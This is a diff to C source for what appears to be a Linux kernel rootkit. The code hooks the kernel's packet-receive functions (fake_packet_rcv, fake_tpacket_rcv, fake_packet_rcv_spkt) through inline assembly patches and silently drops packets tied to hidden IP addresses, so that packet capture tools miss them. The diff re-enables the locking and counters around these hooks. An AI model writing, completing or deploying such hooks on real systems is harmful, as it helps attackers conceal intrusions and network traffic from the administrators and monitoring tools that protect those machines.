@@ -587,27 +587,10 @@ LIST_HEAD(hidden_tcp4_packets);
 int hide_tcp4_packet(const char *ip)
 {
     struct hidden_packet *p = kmalloc(sizeof(struct hidden_packet), GFP_KERNEL);
-    //size_t name_len;
 
     if (!p) {
         return 0;
     }
-
-    /*
-    name_len = strlen(name) + 1;
-
-    // sanity check as `name` could point to some garbage without null anywhere nearby
-    if (name_len -1 > NAME_MAX) {
-        kfree(f);
-        return 0;
-    }
-
-    f->name = kmalloc(name_len, GFP_KERNEL);
-    if (!f->name) {
-        kfree(f);
-        return 0;
-    }
-    */
 
     strncpy(p->ip, ip, 16);
 
@@ -982,24 +965,24 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
 #include <linux/inet.h>
 #include <linux/ip.h>
 #include <linux/ipv6.h>
-//#include <linux/netfilter_defs.h>
+#include <linux/netfilter_defs.h>
 
 /* counter for access counting */
-//static int accesses_packet_rcv = 0;
-//static int accesses_tpacket_rcv = 0;
-//static int accesses_packet_rcv_spkt = 0;
+static int accesses_packet_rcv = 0;
+static int accesses_tpacket_rcv = 0;
+static int accesses_packet_rcv_spkt = 0;
 
 /* mutexes for safe accesses */
-//struct mutex lock_packet_rcv;
-//struct mutex lock_tpacket_rcv;
-//struct mutex lock_packet_rcv_spkt;
+struct mutex lock_packet_rcv;
+struct mutex lock_tpacket_rcv;
+struct mutex lock_packet_rcv_spkt;
 
 
 /* increment counter of a critical section */
-/*
+
 void inc_critical(struct mutex *lock, int *counter)
 {
-	// lock access mutex 
+	// lock access mutex
 	mutex_lock(lock);
 	(*counter)++;
 
@@ -1018,7 +1001,7 @@ void dec_critical(struct mutex *lock, int *counter)
 	// unlock access mutex
 	mutex_unlock(lock);
 }
-*/
+
 
 int packet_check(struct sk_buff *skb)
 {
@@ -1065,12 +1048,12 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	int ret;
 	int (*original_packet_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 
-	//inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
+	inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
 
 	/* Check if we need to hide packet */
 	if(packet_check(skb)) {
 		pr_info("PACKET DROP\n");
-		//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
+		dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
 		return NF_DROP;
 	}
 
@@ -1086,7 +1069,7 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	asm_hook_patch(fake_packet_rcv);
 	
 
-	//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
+	dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
 	pr_info("PACKET ACCEPT\n");
 
 	return ret;
@@ -1098,11 +1081,11 @@ int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	int ret;
 	int (*original_tpacket_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 
-	//inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
+	inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 
 	if(packet_check(skb)) {
-		//debug("PACKET DROP");
-		//dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
+		debug("PACKET DROP");
+		dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 		return NF_DROP;
 	}
 
@@ -1118,9 +1101,8 @@ int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	ret = original_tpacket_rcv(skb, dev, pt, orig_dev);
 	asm_hook_patch(fake_tpacket_rcv);
 
-	//dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
-	//debug("PACKET ACCEPT");
-
+	dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
+	debug("PACKET ACCEPT");
 	return ret;
 }
 
@@ -1131,11 +1113,11 @@ int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
 	int ret;
 	int (*original_packet_rcv_spkt)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 
-	//inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+	inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
 
 	if(packet_check(skb)) {
-		//debug("PACKET DROP");
-		//dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+		debug("PACKET DROP");
+		dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
 		return NF_DROP;
 	}
 
@@ -1151,8 +1133,8 @@ int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
 	asm_hook_patch(fake_packet_rcv_spkt);
 	
 
-	//dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
-	//debug("PACKET ACCEPT");
+	dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+	debug("PACKET ACCEPT");
 
 	return ret;
 }
